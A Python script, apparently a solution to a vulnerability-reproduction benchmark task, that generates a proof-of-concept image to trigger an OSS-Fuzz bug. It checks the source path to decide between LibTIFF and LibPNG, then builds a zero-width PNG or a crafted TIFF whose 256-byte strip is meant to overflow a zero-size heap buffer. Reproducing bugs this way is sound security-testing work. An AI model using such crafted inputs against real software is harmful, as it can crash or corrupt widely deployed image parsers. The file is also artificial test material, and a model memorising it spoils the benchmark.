import struct
import os
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        The issue 'zero width or height images' typically affects image libraries like LibTIFF or LibPNG.
        The ID 'oss-fuzz:42536646' and the description strongly suggest a LibTIFF Heap Buffer Overflow 
        where a zero width causes an allocation of size 0, followed by a write.
        """
        
        is_png = False
        # Heuristic detection of target library
        try:
            path_lower = src_path.lower()
            if "png" in path_lower and "tiff" not in path_lower:
                is_png = True
            
            if os.path.isdir(src_path):
                for root, dirs, files in os.walk(src_path):
                    for f in files:
                        if "tif_dir.c" in f or "tif_aux.c" in f:
                            is_png = False
                            break
                        if "png.c" in f or "pngread.c" in f:
                            is_png = True
                            # Keep checking to prefer TIFF if both found (TIFF is more likely for this specific description)
        except:
            pass

        if is_png:
            # Construct a PNG with Width=0
            # Signature
            png_sig = b'\x89PNG\r\n\x1a\n'
            
            # IHDR Chunk
            # Width=0, Height=10, BitDepth=8, ColorType=2 (Truecolor), Comp=0, Filter=0, Interlace=0
            width = 0
            height = 10
            bit_depth = 8
            color_type = 2
            comp_method = 0
            filter_method = 0
            interlace_method = 0
            
            ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, comp_method, filter_method, interlace_method)
            
            chunk_type = b'IHDR'
            crc = zlib.crc32(chunk_type + ihdr_data) & 0xffffffff
            
            ihdr_chunk = struct.pack('>I', len(ihdr_data)) + chunk_type + ihdr_data + struct.pack('>I', crc)
            
            # Empty IDAT to complete structure (though IHDR 0 width might trigger early)
            idat_data = b'' # No data needed if width is 0
            chunk_type_idat = b'IDAT'
            crc_idat = zlib.crc32(chunk_type_idat + idat_data) & 0xffffffff
            idat_chunk = struct.pack('>I', len(idat_data)) + chunk_type_idat + idat_data + struct.pack('>I', crc_idat)
            
            # IEND
            chunk_type_iend = b'IEND'
            crc_iend = zlib.crc32(chunk_type_iend) & 0xffffffff
            iend_chunk = struct.pack('>I', 0) + chunk_type_iend + struct.pack('>I', crc_iend)
            
            return png_sig + ihdr_chunk + idat_chunk + iend_chunk

        # Construct a TIFF with ImageWidth=0
        # Header: Little Endian (II), Version 42, IFD Offset 8
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # IFD Entries
        # 256: ImageWidth = 0
        # 257: ImageLength = 10
        # 258: BitsPerSample = 8
        # 259: Compression = 1 (None)
        # 262: PhotometricInterpretation = 1 (BlackIsZero)
        # 273: StripOffsets = (calculated later)
        # 277: SamplesPerPixel = 1
        # 278: RowsPerStrip = 10
        # 279: StripByteCounts = 256 (Large enough to write out of bounds if buffer is 0)
        
        tags = [
            (256, 4, 1, 0),
            (257, 4, 1, 10),
            (258, 3, 1, 8),
            (259, 3, 1, 1),
            (262, 3, 1, 1),
            (273, 4, 1, 0),
            (277, 3, 1, 1),
            (278, 4, 1, 10),
            (279, 4, 1, 256),
        ]
        
        # Sort tags (required by TIFF spec)
        tags.sort(key=lambda x: x[0])
        
        num_entries = len(tags)
        # Calculate size of IFD: NumEntries(2) + Entries(12*N) + NextIFD(4)
        ifd_size = 2 + (12 * num_entries) + 4
        
        # Data will follow immediately after IFD
        data_offset = 8 + ifd_size
        
        # Build IFD bytes
        ifd_bytes = bytearray()
        ifd_bytes.extend(struct.pack('<H', num_entries))
        
        for t_id, t_type, t_count, t_val in tags:
            # If tag is StripOffsets (273), update value to point to data
            if t_id == 273:
                t_val = data_offset
            
            # Entry structure: Tag(2), Type(2), Count(4), Value/Offset(4)
            ifd_bytes.extend(struct.pack('<HHII', t_id, t_type, t_count, t_val))
            
        # Next IFD Offset = 0 (End)
        ifd_bytes.extend(struct.pack('<I', 0))
        
        # Payload data corresponding to StripByteCounts
        payload = b'\x41' * 256
        
        return header + ifd_bytes + payload